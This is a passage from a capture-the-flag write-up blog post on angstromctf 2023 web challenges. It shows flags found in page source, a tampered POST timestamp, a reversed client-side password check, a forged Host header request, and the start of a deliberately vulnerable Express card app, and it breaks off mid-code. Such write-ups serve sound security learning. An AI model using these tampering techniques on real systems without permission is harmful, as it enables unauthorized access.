
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="I participated as a solo player to angstromctf 2023. I focused on Web challenges." name="description"/>
<meta content="security, ctf, web, SSTI" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="angstromctf 2023 - WEB" property="og:title"/>
<meta content="I participated as a solo player to angstromctf 2023. I focused on Web challenges." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2023/05/angstromctf-2023-web.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2023-05-02 14:25:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="ctf" property="article:tag"/>
<meta content="web" property="article:tag"/>
<meta content="SSTI" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – angstromctf 2023 - WEB</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="angstromctf-2023-web">angstromctf 2023 - WEB</h1>
<p>
      Posted on 02 May 2023 in <a href="../../category/security.html">security</a>

        • 7 min read
    </p>
</header>
<div>
<p><img alt="angstromctf 2023" class="align-left" src="/media/2023.05/angstromctf.png" width="262"/></p>
<p>I participated as a solo player to angstromctf 2023. I focused on Web challenges.</p>
<h1>catch me if you can</h1>
<ul>
<li>10 points</li>
<li>1150 solves</li>
</ul>
<p>Very simple, sanity check challenge. View source:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;html&gt;</span>
<span class="w">    </span><span class="nt">&lt;head&gt;</span>
<span class="w">        </span><span class="nt">&lt;style&gt;</span>
<span class="w">            </span>body<span class="w"> </span>{
<span class="w">                </span>font-family:<span class="w"> </span>"Comic<span class="w"> </span>Sans<span class="w"> </span>MS",<span class="w"> </span>"Comic<span class="w"> </span>Sans",<span class="w"> </span>cursive;
<span class="w">            </span>}
<span class="w">            </span>#flag<span class="w"> </span>{
<span class="w">                </span>border:<span class="w"> </span>2px<span class="w"> </span>solid<span class="w"> </span>red;
<span class="w">                </span>position:<span class="w"> </span>absolute;
<span class="w">                </span>top:<span class="w"> </span>50%;
<span class="w">                </span>left:<span class="w"> </span>0;
<span class="w">                </span>-moz-user-select:<span class="w"> </span>-moz-none;
<span class="w">                </span>-khtml-user-select:<span class="w"> </span>none;
<span class="w">                </span>-webkit-user-select:<span class="w"> </span>none;
<span class="w">                </span>-ms-user-select:<span class="w"> </span>none;
<span class="w">                </span>user-select:<span class="w"> </span>none;

<span class="w">                </span>animation-name:<span class="w"> </span>spin;
<span class="w">                </span>animation-duration:<span class="w"> </span>3000ms;
<span class="w">                </span>animation-iteration-count:<span class="w"> </span>infinite;
<span class="w">                </span>animation-timing-function:<span class="w"> </span>linear;
<span class="w">            </span>}

<span class="w">            </span>@keyframes<span class="w"> </span>spin<span class="w"> </span>{
<span class="w">                </span>from<span class="w"> </span>{
<span class="w">                    </span>transform:rotate(0deg);
<span class="w">                </span>}
<span class="w">                </span>to<span class="w"> </span>{
<span class="w">                    </span>transform:rotate(360deg);
<span class="w">                </span>}
<span class="w">            </span>}
<span class="w">        </span><span class="nt">&lt;/style&gt;</span>
<span class="w">    </span><span class="nt">&lt;/head&gt;</span>
<span class="w">    </span><span class="nt">&lt;body&gt;</span>
<span class="w">        </span><span class="nt">&lt;h1&gt;</span>catch<span class="w"> </span>me<span class="w"> </span>if<span class="w"> </span>you<span class="w"> </span>can!<span class="nt">&lt;/h1&gt;</span>
<span class="w">        </span><span class="nt">&lt;marquee</span><span class="w"> </span><span class="na">scrollamount=</span><span class="s">"50"</span><span class="w"> </span><span class="na">id=</span><span class="s">"flag"</span><span class="nt">&gt;</span>actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}<span class="nt">&lt;/marquee&gt;</span>
<span class="w">    </span><span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div>
<h1>Celeste Speedrunning Association</h1>
<ul>
<li>20 points</li>
<li>681 solves</li>
</ul>
<p>We need to beat a speed run time. Meaning we can start in the future and have a negative run time.
Just modify the start date of the going request:</p>
<div class="highlight"><pre><span></span><code>POST /submit HTTP/1.1
Host: mount-tunnel.web.actf.co
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Connection: close

start=1700000000
</code></pre></div>
<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
Server: nginx/1.23.3
Date: Thu, 26 Apr 2023 17:24:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 52
Connection: close

you win the flag: actf{wait_until_farewell_speedrun}
</code></pre></div>
<h1>shortcircuit</h1>
<ul>
<li>40 points</li>
<li>770 solves</li>
</ul>
<p>We have a login form with a JavaScript validation. The flag is the password.</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">swap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span>

<span class="w">    </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span>

<span class="w">    </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span>

<span class="w">    </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[]</span>

<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">+=</span><span class="nx">n</span><span class="p">){</span>
<span class="w">        </span><span class="nx">ret</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">i</span><span class="o">+</span><span class="nx">n</span><span class="p">))</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">ret</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">username</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">){</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">swap</span><span class="p">(</span><span class="nx">chunk</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">password</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="mf">30</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7"</span><span class="p">){</span>
<span class="w">            </span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"/win.html"</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"msg"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"block"</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The input password was passed to the <code>chunk</code> function and then to the <code>swap</code> function. The result
 needed to
 be <code>7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7</code>.</p>
<p>The <code>chunk</code> function just cut the 120 characters password into four 30 characters pieces.</p>
<p>The <code>swap</code> function swap the different chunk in the following manner: <code>0123 → 3120 → 3210 → 3012 → 3021</code></p>
<p>Knowing that we could find that the flag was (I left space between the chunk for clarity):
<code>actf{cl1ent_s1de_sucks_544e67e 6317199e454f4d2bdb04d9e419ccc7 f12024523398ee02fe7517fffa9251 7e08250c4aaa9ed206fd7c9e398e2}</code></p>
<h1>directory</h1>
<ul>
<li>40 points</li>
<li>806 solves</li>
</ul>
<p>There was around 5 000 directories and only one contained the flag. I used <code>wget -r -np -k
https://directory.web.actf.co/</code> to recursively download the site (this took time, but I did not care
as I was working on the next challenge during that time) and then used <code>grep</code> to find the flag.</p>
<div class="highlight"><pre><span></span><code>➜  grep actf directory.web.actf.co/*
directory.web.actf.co/3054.html:actf{y0u_f0und_me_b51d0cde76739fa3}
</code></pre></div>
<h1>Celeste Tunneling Association</h1>
<ul>
<li>40 points</li>
<li>566 solves</li>
</ul>
<p>This was a simple website and the code source was provided.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># run via `uvicorn app:app --port 6000`</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">SECRET_SITE</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"flag.local"</span>
<span class="n">FLAG</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">'FLAG'</span><span class="p">]</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">app</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="n">receive</span><span class="p">,</span> <span class="n">send</span><span class="p">):</span>
    <span class="k">assert</span> <span class="n">scope</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'http'</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="n">scope</span><span class="p">[</span><span class="s1">'headers'</span><span class="p">]</span>

    <span class="k">await</span> <span class="n">send</span><span class="p">({</span>
        <span class="s1">'type'</span><span class="p">:</span> <span class="s1">'http.response.start'</span><span class="p">,</span>
        <span class="s1">'status'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
        <span class="s1">'headers'</span><span class="p">:</span> <span class="p">[</span>
            <span class="p">[</span><span class="sa">b</span><span class="s1">'content-type'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'text/plain'</span><span class="p">],</span>
        <span class="p">],</span>
    <span class="p">})</span>

    <span class="c1"># IDK malformed requests or something</span>
    <span class="n">num_hosts</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"host"</span><span class="p">:</span>
            <span class="n">num_hosts</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">if</span> <span class="n">num_hosts</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"host"</span> <span class="ow">and</span> <span class="n">value</span> <span class="o">==</span> <span class="n">SECRET_SITE</span><span class="p">:</span>
                <span class="k">await</span> <span class="n">send</span><span class="p">({</span>
                    <span class="s1">'type'</span><span class="p">:</span> <span class="s1">'http.response.body'</span><span class="p">,</span>
                    <span class="s1">'body'</span><span class="p">:</span> <span class="n">FLAG</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
                <span class="p">})</span>
                <span class="k">return</span>

    <span class="k">await</span> <span class="n">send</span><span class="p">({</span>
        <span class="s1">'type'</span><span class="p">:</span> <span class="s1">'http.response.body'</span><span class="p">,</span>
        <span class="s1">'body'</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'Welcome to the _tunnel_. Watch your step!!'</span><span class="p">,</span>
    <span class="p">})</span>
</code></pre></div>
<p>Looking at the source code we understood that we needed one <code>host</code> header with the value
<code>flag.local</code>. Using burp we modified the request to look like the following and got the flag in the
response.</p>
<div class="highlight"><pre><span></span><code>GET / HTTP/2
Host: flag.local
</code></pre></div>
<div class="highlight"><pre><span></span><code>HTTP/2 200 OK
Content-Type: text/plain
Date: Thu, 26 Apr 2023 18:07:54 GMT
Server: uvicorn

actf{reaching_the_core__chapter_8}
</code></pre></div>
<h1>hallmark</h1>
<ul>
<li>80 points</li>
<li>243 solves</li>
</ul>
<p>We could generate cards and shared them via the site. There was also an admin app that simulated
the administrator behavior and would browse card we sent it.</p>
<div class="highlight"><pre><span></span><code>  app
    static
      ﰟ cake.svg
      ﰟ flowers.svg
      ﰟ heart.svg
      ﰟ snowman.svg
    󰡨 Dockerfile
     index.html
     index.js
     package-lock.json
     package.json
</code></pre></div>
<p>The app was pretty straightforward and consisted mostly of the <code>index.js</code> file.</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">bodyParser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"body-parser"</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">cookieParser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"cookie-parser"</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"path"</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">v4</span><span class="o">:</span><span class="w"> </span><span class="nx">uuidv4</span><span class="p">,</span><span class="w"> </span><span class="nx">v4</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"uuid"</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"fs"</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">IMAGES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">heart</span><span class="o">:</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">"./static/heart.svg"</span><span class="p">),</span>
<span class="w">    </span><span class="nx">snowman</span><span class="o">:</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">"./static/snowman.svg"</span><span class="p">),</span>
<span class="w">    </span><span class="nx">flowers</span><span class="o">:</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">"./static/flowers.svg"</span><span class="p">),</span>
<span class="w">    </span><span class="nx">cake</span><span class="o">:</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">"./static/cake.svg"</span><span class="p">)</span>
<span class="p">};</span>

<span class="nb">Object</span><span class="p">.</span><span class="nx">freeze</span><span class="p">(</span><span class="nx">IMAGES</span><span class="p">)</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="mf">8080</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"secretpw"</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"actf{placeholder_flag}"</span><span class="p">;</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">cards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/static'</span><span class="p">,</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="k">static</span><span class="p">(</span><span class="s1">'static'</span><span class="p">))</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/card"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">cards</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="nx">cards</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">].</span><span class="nx">type</span><span class="p">);</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">cards</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">].</span><span class="nx">content</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"bad id"</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/card"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">svg</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"text/plain"</span><span class="p">;</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">v4</span><span class="p">();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">svg</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"text"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"text/plain"</span><span class="p">;</span>
<span class="w">        </span><span class="nx">cards</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">type</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"image/svg+xml"</span><span class="p">;</span>
<span class="w">        </span><span class="nx">cards</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">type</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="o">:</span><span class="w"> </span><span class="nx">IMAGES</span><span class="p">[</span><span class="nx">svg</span><span class="p">]</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">"/card?id="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="s2">"/card"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="p">,</span><span class="w"> </span><span class="nx">type</span><span class="p">,</span><span class="w"> </span><span class="nx">svg</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">id</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">cards</span><span class="p">[</span><span class="nx">id</span><span class="p">]){</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"bad id"</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">cards</span><span class="p">[</span><span class="nx">id</span><span class="p">].</span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"image/svg+xml"</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s2">"text/plain"</span><span class="p">;</span>
